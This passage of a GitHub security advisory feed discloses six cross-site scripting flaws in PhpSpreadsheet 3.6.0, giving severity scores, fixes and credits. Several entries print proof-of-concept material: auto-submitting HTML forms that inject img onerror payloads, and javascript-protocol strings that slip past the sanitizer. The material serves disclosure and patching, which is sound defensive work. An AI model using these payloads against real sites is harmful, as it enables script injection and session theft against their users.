        <title type="html"><![CDATA[[phpoffice/phpexcel] PhpSpreadsheet allows unauthorized Reflected XSS in `Convert-Online.php` file]]></title>
        <id>https://github.com/advisories/GHSA-x88g-h956-m5xg</id>
        <link href="https://github.com/advisories/GHSA-x88g-h956-m5xg"/>
        <updated>2025-03-06T18:19:35.000Z</updated>
        <content type="html"><![CDATA[<h1 id="unauthorized-reflected-xss-in-convert-onlinephp-file">Unauthorized Reflected XSS in <code>Convert-Online.php</code> file</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)
<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)
<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> script, an attacker can perform a XSS-type attack 
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> file
<strong>Exploitation conditions</strong>: an unauthorized user
<strong>Mitigation</strong>: sanitization of the quantity variable
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Convert-Online.php</code> file) in Phpspreadsheet.</p>
<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> file, which leads to the possibility of a XSS attack.</p>
<p><img alt="fig4" src="https://github.com/user-attachments/assets/71a6ab8b-db65-4e7e-bb36-39f0bd0f7077"></p>
<p><em>Figure 4. The message with the quantity parameter is displayed without sanitization</em></p>
<p>The following figure shows a POST HTTP-request and a response to the server with the variable quantity, which is displayed in the response from the server without sanitization.</p>
<img src="https://github.com/user-attachments/assets/022323c9-ca1e-44ea-9380-37ed7848e971" alt="fig5" width="460">

<p><em>Figure 5. In the server's response , the quantity variable is displayed without sanitization</em></p>
<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>
<p><em>Listing 3. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
    &lt;form action="https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php" method="POST"&gt;
      &lt;input type="hidden" name="category" value="Weight&amp;#32;and&amp;#32;Mass" /&gt;
      &lt;input type="hidden" name="quantity" value="1&amp;#46;0&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;" /&gt;
      &lt;input type="hidden" name="fromUnit" value="g" /&gt;
      &lt;input type="hidden" name="toUnit" value="g" /&gt;
      &lt;input type="hidden" name="submitx" value="Convert" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      history.pushState('', '', '/');
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>After the user visits the attacker's resource, the form will be sent to the vulnerable scenario, which will lead to the execution of arbitrary code in the client's browser.</p>
<img src="https://github.com/user-attachments/assets/e52b68c6-5a98-4db2-85ec-5bf37e4cb625" alt="fig6" width="389">

<p><em>Figure 6. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-x88g-h956-m5xg">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-x88g-h956-m5xg</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56408">https://nvd.nist.gov/vuln/detail/CVE-2024-56408</a></li>
<li><a href="https://github.com/advisories/GHSA-x88g-h956-m5xg">https://github.com/advisories/GHSA-x88g-h956-m5xg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x88g-h956-m5xg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-03T16:05:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpexcel] PhpSpreadsheet allows unauthorized Reflected XSS in Currency.php file]]></title>
        <id>https://github.com/advisories/GHSA-j2xg-cjcx-4677</id>
        <link href="https://github.com/advisories/GHSA-j2xg-cjcx-4677"/>
        <updated>2025-03-06T18:18:56.000Z</updated>
        <content type="html"><![CDATA[<h1 id="unauthorized-reflected-xss-in-currencyphp-file">Unauthorized Reflected XSS in <code>Currency.php</code> file</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)
<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)
<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> script, an attacker can perform XSS-type attack
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file
<strong>Exploitation conditions</strong>: an unauthorized user
<strong>Mitigation</strong>: sanitization of the <code>currency</code> variable
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Currency.php</code> file) in Phpspreadsheet.</p>
<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file, which leads to the possibility of a XSS attack.
Strings are formed using the <code>currency</code> parameter without sanitization, controlled by an attacker.</p>
<p><img alt="fig9" src="https://github.com/user-attachments/assets/dfac3fbf-de42-42af-8163-b76f0c54da6c"></p>
<p><em>Figure 9.  A fragment of the query in which a string and a parameter are formed without sanitization</em></p>
<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>
<p><em>Listing 5. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
    &lt;form action="https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php" method="POST"&gt;
      &lt;input type="hidden" name="number" value="1234&amp;#46;5678" /&gt;
      &lt;input type="hidden" name="currency" value="&amp;#36;&amp;apos;&amp;quot;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;" /&gt;
      &lt;input type="hidden" name="decimals" value="2" /&gt;
      &lt;input type="hidden" name="position" value="1" /&gt;
      &lt;input type="hidden" name="spacing" value="0" /&gt;
      &lt;input type="hidden" name="submit" value="Display&amp;#32;Mask" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      history.pushState('', '', '/');
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>After sending the script provided in Listing 5, the XSS vulnerability is exploited. Figure 10 shows the execution of arbitrary JavaScript code during the submission of a POST form. </p>
<img src="https://github.com/user-attachments/assets/2be8c94b-03ac-40d9-aa7a-9d326eb79335" alt="fig10" width="428">

<p><em>Figure 10. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56409">https://nvd.nist.gov/vuln/detail/CVE-2024-56409</a></li>
<li><a href="https://github.com/advisories/GHSA-j2xg-cjcx-4677">https://github.com/advisories/GHSA-j2xg-cjcx-4677</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j2xg-cjcx-4677</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-03T17:06:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpexcel] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability in custom properties]]></title>
        <id>https://github.com/advisories/GHSA-wv23-996v-q229</id>
        <link href="https://github.com/advisories/GHSA-wv23-996v-q229"/>
        <updated>2025-03-06T18:18:13.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cross-site-scripting-xss-vulnerability-in-custom-properties">Cross-Site Scripting (XSS) vulnerability in custom properties</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description</strong>: the HTML page is generated without clearing custom properties
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateMeta</code>
<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
<strong>Mitigation</strong>: additional sanitization of special characters in a string
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability in custom properties in Phpspreadsheet.
The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
<p><em>Listing 9. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileName = './doc/Book1.xlsx';
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.
The Excel file is unpacked and a custom property in the file is inserted into the <code>docProps/custom.xml</code> file.</p>
<p><img alt="fig17" src="https://github.com/user-attachments/assets/65453b48-bca5-4f5c-a683-315a7bb1ab1f"></p>
<p><em>Figure 17. Embedding the payload</em></p>
<p>After making the changes, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into an HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>
<p><img alt="fig18" src="https://github.com/user-attachments/assets/e0f63bfb-d9e1-4c9d-a2a9-8a0a20406cdc"></p>
<p><em>Figure 18. Getting a custom property</em></p>
<p>When calling the static <code>generateMeta</code> method, you can see that the key of the custom property is displayed without sanitization.</p>
<p><img alt="fig19" src="https://github.com/user-attachments/assets/8c74e264-af68-4f62-8ac7-437e65884e86"></p>
<p><em>Figure 19. Getting a custom property</em></p>
<p>As a result, when viewing the excel file as the HTML representation, arbitrary JavaScript code will be executed.</p>
<img src="https://github.com/user-attachments/assets/a6ed21e3-685c-415c-b2dc-453bc0652bef" alt="fig20" width="356">

<p><em>Figure 20. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56410">https://nvd.nist.gov/vuln/detail/CVE-2024-56410</a></li>
<li><a href="https://github.com/advisories/GHSA-wv23-996v-q229">https://github.com/advisories/GHSA-wv23-996v-q229</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wv23-996v-q229</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T17:25:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpexcel] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header]]></title>
        <id>https://github.com/advisories/GHSA-hwcp-2h35-p66w</id>
        <link href="https://github.com/advisories/GHSA-hwcp-2h35-p66w"/>
        <updated>2025-03-06T18:17:35.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cross-site-scripting-xss-vulnerability-of-the-hyperlink-base-in-the-html-page-header">Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description</strong>: the HTML page is formed without sanitizing the hyperlink base
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateHTMLHeader</code>
<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
<strong>Mitigation</strong>: additional sanitization of special characters in a string
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header in Phpspreadsheet.
The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
<p><em>Listing 8. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileName = './doc/Book1.xlsx';
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.
The Excel file is unpacked and a HyperlinkBase in the file is inserted into the <code>docProps/app.xml</code> file.</p>
<p><img alt="fig14" src="https://github.com/user-attachments/assets/f68ef7fc-e78e-4424-8753-4318b6ff51c3"></p>
<p><em>Figure 14. Embedding the payload</em> </p>
<p>After the changes were made, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into the HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>
<p><img alt="fig15" src="https://github.com/user-attachments/assets/0aa7398c-ddd9-4c5a-ab04-41af0236dcba"></p>
<p><em>Figure 15. Generating the HTML page header using the HyperlinkBase property</em> </p>
<p>After generating and displaying the HTML representation of the XLSX file, arbitrary JavaScript code will be executed.
<img src="https://github.com/user-attachments/assets/c3694661-31e3-4be8-9a86-6eb4dd4647b5" alt="fig16" width="356"></p>
<p><em>Figure 16. Executing arbitrary JavaScript code</em> </p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56411">https://nvd.nist.gov/vuln/detail/CVE-2024-56411</a></li>
<li><a href="https://github.com/advisories/GHSA-hwcp-2h35-p66w">https://github.com/advisories/GHSA-hwcp-2h35-p66w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hwcp-2h35-p66w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T17:28:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpexcel] PhpSpreadsheet allows bypass XSS sanitizer using the javascript protocol and special characters]]></title>
        <id>https://github.com/advisories/GHSA-q9jv-mm3r-j47r</id>
        <link href="https://github.com/advisories/GHSA-q9jv-mm3r-j47r"/>
        <updated>2025-03-06T18:16:57.000Z</updated>
        <content type="html"><![CDATA[<h1 id="bypass-xss-sanitizer-using-the-javascript-protocol-and-special-characters">Bypass XSS sanitizer using the javascript protocol and special characters</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description</strong>: an attacker can use special characters, so that the library processes the javascript protocol with special characters and generates an HTML link
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateRow</code>
<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
<strong>Mitigation</strong>: additional sanitization of special characters in a string
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Bypass XSS sanitizer using the javascript protocol and special characters in Phpspreadsheet.</p>
<p>The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
<p><em>Listing 6. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileName = './doc/Book1.xlsx';
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>An attacker can use special characters so that this library processes the javascript protocol with special characters and generates a HTML link.
The Excel file is unpacked and a hyperlink in the file is inserted into the <code>xl/worksheets/sheet1.xml</code> file.</p>
<p><img alt="fig11" src="https://github.com/user-attachments/assets/b9d53f7a-6f36-4853-95f9-8aa22f81eccd"></p>
<p><em>Figure 11. Using the javascript protocol with special characters</em></p>
<p>Some payloads help bypass the security system and carry out a XSS attack.</p>
<p><em>Listing 7. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>jav&amp;#x09;ascript:alert()
jav&amp;#x0D;ascript:alert()
jav&amp;#x0A;ascript:alert()
</code></pre>
<p>It's clear that the javascript protocol with special characters is used. </p>
<p><img alt="fig12" src="https://github.com/user-attachments/assets/7595e88b-9848-4251-845c-2c2d8032e479"></p>
<p><em>Figure 12. Using the javascript protocol with special characters</em></p>
<p>Due to the special characters, the execution stream ends up on line 1543, and the link is built in HTML form with the javascript protocol.</p>
<img src="https://github.com/user-attachments/assets/3ca0c3c6-daa9-4502-ad9e-b803f308fd26" alt="fig13" width="373">

<p><em>Figure 13. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56412">https://nvd.nist.gov/vuln/detail/CVE-2024-56412</a></li>
<li><a href="https://github.com/advisories/GHSA-q9jv-mm3r-j47r">https://github.com/advisories/GHSA-q9jv-mm3r-j47r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q9jv-mm3r-j47r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T17:29:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpexcel] Cross-Site Scripting (XSS) vulnerability in generateNavigation() function in PhpSpreadsheet]]></title>
        <id>https://github.com/advisories/GHSA-79xx-vf93-p7cx</id>
        <link href="https://github.com/advisories/GHSA-79xx-vf93-p7cx"/>
        <updated>2025-03-06T18:16:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability in the code which translates the XLSX file into a HTML representation and displays it in the response.</p>
<h3 id="details">Details</h3>
<p>When generating the HTML from an xlsx file containing multiple sheets, a navigation menu is created. This menu includes the sheet names, which are not sanitized. As a result, an attacker can exploit this vulnerability to execute JavaScript code.</p>
<pre><code class="language-php">        // Construct HTML
        $html = '';

        // Only if there are more than 1 sheets
        if (count($sheets) &gt; 1) {
            // Loop all sheets
            $sheetId = 0;

            $html .= '&lt;ul class="navigation"&gt;' . PHP_EOL;

            foreach ($sheets as $sheet) {
                $html .= '  &lt;li class="sheet' . $sheetId . '"&gt;&lt;a href="#sheet' . $sheetId . '"&gt;' . $sheet-&gt;getTitle() . '&lt;/a&gt;&lt;/li&gt;' . PHP_EOL;
                ++$sheetId;
            }

            $html .= '&lt;/ul&gt;' . PHP_EOL;
        }
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li><p>Create an XLSX file with multiple sheets : 
<img alt="image" src="https://github.com/user-attachments/assets/e3fc027a-9525-4d7f-b107-cfa6e78d04e7"></p>
</li>
<li><p>Generate the HTML content</p>
</li>
</ol>
<pre><code class="language-php">&lt;?php
    require __DIR__ . '/vendor/autoload.php';

    $inputFileName = 'payload.xlsx';
    $spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
    $writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
    $writer-&gt;writeAllSheets();
    echo $writer-&gt;generateHTMLAll();
?&gt;
</code></pre>
<ol start="3">
<li>Enjoy
<img alt="image" src="https://github.com/user-attachments/assets/3e3c24f4-cb5d-451d-978f-9d33234f3bd1"></li>
</ol>
<h3 id="impact">Impact</h3>
<p>XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise.
Example of impacts :</p>
<ul>
<li>Disclosure of the user’s session cookie, allowing an attacker to hijack the user’s session and take over the account (Only if HttpOnly cookie's flag is set to false).</li>
<li>Redirecting the user to some other page or site (like phishing websites)</li>
<li>Modifying the content of the current page (add a fake login page that sends credentials to the attacker).</li>
<li>Automatically download malicious files.</li>
<li>Requests access to the victim geolocation / camera.</li>
<li>...</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-22131">https://nvd.nist.gov/vuln/detail/CVE-2025-22131</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/4088381ccfaf241d7d42c333de0dc8c98e338743">https://github.com/PHPOffice/PhpSpreadsheet/commit/4088381ccfaf241d7d42c333de0dc8c98e338743</a></li>
<li><a href="https://github.com/advisories/GHSA-79xx-vf93-p7cx">https://github.com/advisories/GHSA-79xx-vf93-p7cx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79xx-vf93-p7cx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-21T21:09:13.000Z</published>
    </entry>
</feed>